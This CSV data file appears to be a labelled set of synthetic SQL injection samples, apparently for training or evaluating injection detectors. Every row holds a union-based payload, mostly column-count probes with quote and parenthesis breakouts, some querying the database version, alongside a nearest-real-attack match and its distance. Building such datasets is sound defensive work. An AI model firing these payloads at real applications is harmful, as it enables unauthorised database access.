id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000200,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000310,5.979840537741198
CTGAN_000201,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,5.55987086117801
CTGAN_000202,attack,union,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000554,5.446176118586013
CTGAN_000203,attack,union,"-8203""  )   union all select 6394,6394,6394,6394,6394--",nearest_attack_euclidean,R000957,5.187839396901534
CTGAN_000204,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R000709,4.683382551287782
CTGAN_000205,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000848,6.360800040985513
CTGAN_000206,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000203,6.437049253129453
CTGAN_000207,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R001353,5.564641268211936
CTGAN_000208,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,6.743819369757353
CTGAN_000209,attack,union," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000142,10.535011747146331
CTGAN_000210,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000230,4.222639082259378
CTGAN_000211,attack,union,"-5548' where 4477  =  4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",nearest_attack_euclidean,R000677,5.487506474659958
CTGAN_000212,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000468,5.512248860042284
CTGAN_000213,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000909,5.900974664206526
CTGAN_000214,attack,union,"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",nearest_attack_euclidean,R000745,6.827436037770425
CTGAN_000215,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000890,5.919606122878378
CTGAN_000216,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001337,7.173635903079751
CTGAN_000217,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R000716,6.856607098347954
CTGAN_000218,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000134,5.958371882709651
CTGAN_000219,attack,union,"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",nearest_attack_euclidean,R000707,6.924758104777404
CTGAN_000220,attack,union,"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",nearest_attack_euclidean,R000551,3.2707168411095697
CTGAN_000221,attack,union,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",nearest_attack_euclidean,R000698,5.215571835787184
CTGAN_000222,attack,union,"-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#",nearest_attack_euclidean,R000814,5.88046740611272
CTGAN_000223,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000939,3.6380281986147733
CTGAN_000224,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R001434,4.3524690342668935
CTGAN_000225,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000909,4.290446338780471
CTGAN_000226,attack,union,"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",nearest_attack_euclidean,R000586,5.4482638438015565
CTGAN_000227,attack,union,"-8021""  )   union all select 1166,1166,1166,1166--",nearest_attack_euclidean,R001532,6.049727529425209
CTGAN_000228,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,5.938087164243572
CTGAN_000229,attack,union," select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000182,7.7513653725450755
CTGAN_000230,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000771,5.860753614949199
CTGAN_000231,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,5.94499785249729
CTGAN_000232,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000728,8.947376003880297
CTGAN_000233,attack,union," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000095,6.279512212312386
CTGAN_000234,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001047,5.621779391430407
CTGAN_000235,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R001172,4.954387785035053
CTGAN_000236,attack,union,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",nearest_attack_euclidean,R001468,5.94425192271251
CTGAN_000237,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000203,6.500604898712618
CTGAN_000238,attack,union,"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",nearest_attack_euclidean,R000600,7.102466096528079
CTGAN_000239,attack,union,"-4236  )   union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",nearest_attack_euclidean,R000422,4.241681704615849
CTGAN_000240,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000074,7.0708862023020576
CTGAN_000241,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000410,4.9964208052378405
CTGAN_000242,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,4.224159058939811
CTGAN_000243,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R000482,4.988674244932492
CTGAN_000244,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000258,6.375445368417088
CTGAN_000245,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000301,5.077517426531022
CTGAN_000246,attack,union,"1' union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000928,6.925844094371057
CTGAN_000247,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000719,5.0382243030628695
CTGAN_000248,attack,union,"1%'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R001522,4.884918071444184
CTGAN_000249,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000446,5.612055382443081
CTGAN_000250,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000742,6.429453956085486
CTGAN_000251,attack,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000400,5.4644209591731325
CTGAN_000252,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,3.977435486392922
CTGAN_000253,attack,union,"-9382'  )   union all select 4774,4774,4774,4774--",nearest_attack_euclidean,R001121,6.729445475118959
CTGAN_000254,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,5.170830345894232
CTGAN_000255,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,5.932551297338238
CTGAN_000256,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,5.336858840960127
CTGAN_000257,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R001434,6.009590780712017
CTGAN_000258,attack,union,"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",nearest_attack_euclidean,R001413,3.440222808167174
CTGAN_000259,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000913,6.109320615903818
CTGAN_000260,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001431,6.389104408488103
CTGAN_000261,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,7.4471607353914155
CTGAN_000262,attack,union,"-5425 where 5933  =  5933 union all select 5933,5933,5933--",nearest_attack_euclidean,R001514,5.455047028308862
CTGAN_000263,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R001080,5.491822353465736
CTGAN_000264,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001552,5.195811480192185
CTGAN_000265,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,4.996187468279135
CTGAN_000266,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R001369,6.5008837099062715
CTGAN_000267,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R000379,5.421426877909289
CTGAN_000268,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000963,6.6425092794664495
CTGAN_000269,attack,union,"1%'   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R001302,4.4219306846163215
CTGAN_000270,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R001085,4.062192882496875
CTGAN_000271,attack,union,"-3781  )   union all select 3916,3916,3916--",nearest_attack_euclidean,R000943,4.263225976933596
CTGAN_000272,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000211,4.840454067355085
CTGAN_000273,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,4.5969169120020315
CTGAN_000274,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,4.850401273982983
CTGAN_000275,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000251,5.087657614692007
CTGAN_000276,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000719,4.964519063221888
CTGAN_000277,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000258,6.650693702381551
CTGAN_000278,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000501,5.308103995655807
CTGAN_000279,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000317,4.991954287927166
CTGAN_000280,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000341,4.492508845902076
CTGAN_000281,attack,union,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",nearest_attack_euclidean,R000303,5.326183558433663
CTGAN_000282,attack,union,"1' in boolean mode  )   union all select null,null--",nearest_attack_euclidean,R000376,5.285481663640108
CTGAN_000283,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000280,4.643709953773773
CTGAN_000284,attack,union,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",nearest_attack_euclidean,R001471,5.166454319357463
CTGAN_000285,attack,union,"-6940'  )   union all select 3042,3042,3042,3042,3042#",nearest_attack_euclidean,R000250,5.052124595937884
CTGAN_000286,attack,union,-4331  )   as inpx where 9804  =  9804 union all select 9804#,nearest_attack_euclidean,R000652,6.693580979313063
CTGAN_000287,attack,union,"1  )   where 8630  =  8630 union all select null,null--",nearest_attack_euclidean,R000548,5.363798451174204
CTGAN_000288,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,4.670605138096719
CTGAN_000289,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000341,4.86968920736452
CTGAN_000290,attack,union,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",nearest_attack_euclidean,R000736,4.4349963227619025
CTGAN_000291,attack,union,1'  )   where 4509  =  4509 union all select null--,nearest_attack_euclidean,R001070,5.9225545579995975
CTGAN_000292,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,5.323375346686861
CTGAN_000293,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000727,6.330149840564943
CTGAN_000294,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R001080,6.245629322716584
CTGAN_000295,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,6.180208193660874
CTGAN_000296,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000848,5.473594577605459
CTGAN_000297,attack,union,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",nearest_attack_euclidean,R000766,4.468798386059505
CTGAN_000298,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000976,6.327781803553925
CTGAN_000299,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,6.835245086090587
CTGAN_000300,attack,union,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,nearest_attack_euclidean,R001285,6.073293627152825
CTGAN_000301,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,5.7245672771452965
CTGAN_000302,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R001099,5.352059750699773
CTGAN_000303,attack,union," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000142,7.504775472498382
CTGAN_000304,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001064,6.215945472263277
CTGAN_000305,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001064,5.526152791378116
CTGAN_000306,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,5.314077389110618
CTGAN_000307,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000252,4.615880286306337
CTGAN_000308,attack,union,"-3282'  )   union all select 9002,9002,9002,9002,9002#",nearest_attack_euclidean,R001355,6.247374104118213
CTGAN_000309,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R001228,5.079297682327494
CTGAN_000310,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,4.804107390249214
CTGAN_000311,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000460,6.250237436114122
CTGAN_000312,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,4.860619807902381
CTGAN_000313,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R001400,5.557674313069005
CTGAN_000314,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,8.063309337048688
CTGAN_000315,attack,union,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",nearest_attack_euclidean,R000660,5.493039753054627
CTGAN_000316,attack,union,"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",nearest_attack_euclidean,R000787,6.234461841578609
CTGAN_000317,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,5.959424067404189
CTGAN_000318,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R001214,5.352412939084687
CTGAN_000319,attack,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",nearest_attack_euclidean,R000414,4.605278021233965
CTGAN_000320,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000909,5.81278792378022
CTGAN_000321,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R001120,3.532454642317041
CTGAN_000322,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000835,7.147164850530966
CTGAN_000323,attack,union,"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",nearest_attack_euclidean,R000667,4.796250350550697
CTGAN_000324,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000825,3.9299556940169444
CTGAN_000325,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,3.1839506921513254
CTGAN_000326,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R001154,4.067708124557526
CTGAN_000327,attack,union,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",nearest_attack_euclidean,R000515,5.595900300099306
CTGAN_000328,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000973,5.349778087382468
CTGAN_000329,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000699,5.095841244029947
CTGAN_000330,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000421,5.939134942543434
CTGAN_000331,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,6.7638034635827085
CTGAN_000332,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000380,4.740717952582341
CTGAN_000333,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000786,5.6218101530319835
CTGAN_000334,attack,union,"1""  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000597,5.896612564340404
CTGAN_000335,attack,union,"-1432""   )    )    union all select 9008,9008,9008#",nearest_attack_euclidean,R000996,6.789900878072031
CTGAN_000336,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,4.518407847850604
CTGAN_000337,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000172,6.785413784812491
CTGAN_000338,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000473,5.745521982478327
CTGAN_000339,attack,union,"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",nearest_attack_euclidean,R001354,4.700721973830225
CTGAN_000340,attack,union,"-1755%' union all select 2615,2615,2615,2615,2615,2615#",nearest_attack_euclidean,R000603,5.019030244898024
CTGAN_000341,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000501,3.376584341811764
CTGAN_000342,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000598,6.311511370167972
CTGAN_000343,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,6.7346852374087645
CTGAN_000344,attack,union,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",nearest_attack_euclidean,R001084,7.621123431944715
CTGAN_000345,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R001380,5.760871054796433
CTGAN_000346,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001337,5.662391803034184
CTGAN_000347,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,5.4845996381283255
CTGAN_000348,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000921,6.0050422540596635
CTGAN_000349,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000371,6.547025256325935
CTGAN_000350,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R001369,5.0313243309740106
CTGAN_000351,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001024,5.014765083896339
CTGAN_000352,attack,union,"-7008'   )    )    union all select 9080,9080,9080#",nearest_attack_euclidean,R001145,7.078150276554663
CTGAN_000353,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R001249,5.98795949158107
CTGAN_000354,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R001546,5.046888857543402
CTGAN_000355,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000749,6.032363069143737
CTGAN_000356,attack,union,"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",nearest_attack_euclidean,R000721,5.247957274809331
CTGAN_000357,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000913,3.9026984784595795
CTGAN_000358,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000469,5.521942834992666
CTGAN_000359,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000659,6.9133146056612125
CTGAN_000360,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000704,5.703769989997864
CTGAN_000361,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001064,6.433279595286566
CTGAN_000362,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000287,6.436431403861794
CTGAN_000363,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000307,4.822103155597509
CTGAN_000364,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001381,7.403257376261141
CTGAN_000365,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000566,5.758095028747465
CTGAN_000366,attack,union,"-1015""   )    )    union all select 6624,6624#",nearest_attack_euclidean,R000885,8.287877970591012
CTGAN_000367,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001040,5.774885940108419
CTGAN_000368,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R001154,4.99993120160645
CTGAN_000369,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R001199,5.484131856943469
CTGAN_000370,attack,union,-1188   )    )    union all select 4711--,nearest_attack_euclidean,R001323,6.107815977544781
CTGAN_000371,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000219,4.848202166980709
CTGAN_000372,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R001338,5.493355667324288
CTGAN_000373,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001337,6.0258943344488864
CTGAN_000374,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000731,5.311459223490696
CTGAN_000375,attack,union,1' in boolean mode  )   union all select null--,nearest_attack_euclidean,R000305,5.141651449256186
CTGAN_000376,attack,union,"-2701""   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",nearest_attack_euclidean,R000467,5.209175832066179
CTGAN_000377,attack,union,-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--,nearest_attack_euclidean,R001424,6.3875837667662045
CTGAN_000378,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000850,3.940584815495988
CTGAN_000379,attack,union,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",nearest_attack_euclidean,R000277,5.610772917918731
CTGAN_000380,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001171,5.4312064906659465
CTGAN_000381,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R001431,4.709546817549086
CTGAN_000382,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000180,6.351747561838093
CTGAN_000383,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,3.9297170150163887
CTGAN_000384,attack,union,"-5643'   )    )    union all select 1515,1515#",nearest_attack_euclidean,R001119,6.651648089924953
CTGAN_000385,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000867,5.552070634869563
CTGAN_000386,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R001142,5.857733133427148
CTGAN_000387,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,6.2751727592846995
CTGAN_000388,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R001337,5.195041391331775
CTGAN_000389,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R001043,4.345441144507958
CTGAN_000390,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R001474,5.155835118570966
CTGAN_000391,attack,union,"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000910,4.601775852700402
CTGAN_000392,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000230,4.352421836663845
CTGAN_000393,attack,union," select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000182,8.580882516671437
CTGAN_000394,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R001552,3.8637139659919146
CTGAN_000395,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000742,3.891962239241356
CTGAN_000396,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000825,4.54393413005512
